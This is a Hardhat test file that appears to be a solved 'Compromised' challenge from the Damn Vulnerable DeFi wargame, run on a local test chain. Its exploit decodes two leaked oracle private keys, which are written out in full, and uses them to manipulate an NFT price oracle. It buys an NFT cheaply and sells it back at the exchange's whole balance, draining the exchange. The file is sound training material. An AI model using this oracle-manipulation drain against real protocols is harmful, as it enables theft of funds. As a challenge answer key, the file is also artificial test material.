const { Web3Provider } = require('@ethersproject/providers');
const { expect } = require('chai');
const { Wallet } = require('ethers');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        /*
        DECODED DATA FROM API RESPONSE by converting the hex chain to text
        - First Line: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
        Base64 decode (private key One): 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        
        - Second Line: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
        Base64 decide (private key Two): 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

        */
        
        const privateKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
        const publicKeys = privateKeys.map(hexValues =>{return ethers.utils.computeAddress(hexValues)});
        console.log(" ");
        console.log(`The leaked addresses are: ${publicKeys}`);
        console.log(" ");
        
        // The following line creates the Wallet instances to connect them as signers.
        let sourceWallets = privateKeys.map(keys => {return new ethers.Wallet(keys, ethers.provider)}) ;

        // Helper function that loops over all the addresses making the calls to the Oracle contract.
        const manipulatePrice = async (newPrice) => {
            for (const wallet of sourceWallets){
                let etherBalance = ethers.utils.formatEther(await ethers.provider.getBalance(wallet.address));
                console.log(" ");
                console.log("=======================================")
                console.log(`Acting as wallet ${wallet.address}. It has a balance of ${etherBalance} ETH` );
                console.log(`Changing DVNFT price to ${newPrice} ETH....`);
                let parsedPrice = ethers.utils.parseEther(newPrice);
                await this.oracle.connect(wallet).postPrice("DVNFT", parsedPrice);

                expect(
                    ethers.utils.formatEther(await this.oracle.getPriceBySource("DVNFT", wallet.address))
                    ).to.equal(
                        ethers.utils.formatEther(parsedPrice));
                console.log("The price has been changed successfully.");
                console.log(" ");
            }
            let oracleNFTPrice = ethers.utils.formatEther(await this.oracle.connect(attacker).getMedianPrice("DVNFT"));
            console.log(`The computed price by the oracle is now ${oracleNFTPrice} ETH`);
            console.log(" ");
        }

        let newPrice = "0.05"
        await manipulatePrice(newPrice);
        
        // Minting One token.    
        const gasEstimate = await this.exchange.estimateGas.buyOne({value: ethers.utils.parseEther("0.1")});
        let mintedTokenID = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(newPrice), gasLimit: gasEstimate });
        let attackerBalance = (await this.nftToken.balanceOf(attacker.address));
        expect(attackerBalance).to.equal(1);
        console.log(await this.nftToken.ownerOf(0))
        console.log("=======================================");
        console.log(`Successfully minted a token @ ${newPrice} ETH. The attacker now has ${attackerBalance} NFTs`);
        console.log("=======================================");

        // Getting the current exchange balance in order to drain it.
        let currentExchangeBalance = ethers.utils.formatEther(await ethers.provider.getBalance(this.exchange.address));
        console.log(`The exchange currently has a balance of ${currentExchangeBalance} ETH.`)
        
        // Setting up the price as the amount to drain.
        await manipulatePrice(currentExchangeBalance);

        // Starting the draining process.
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        // console.log(await this.nftToken.ownerOf(0)); // ===> Check that the first token has 0 as index.
        await this.exchange.connect(attacker).sellOne(0);

        // Placing the NFT price back to its older price.
        await manipulatePrice("999");


    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
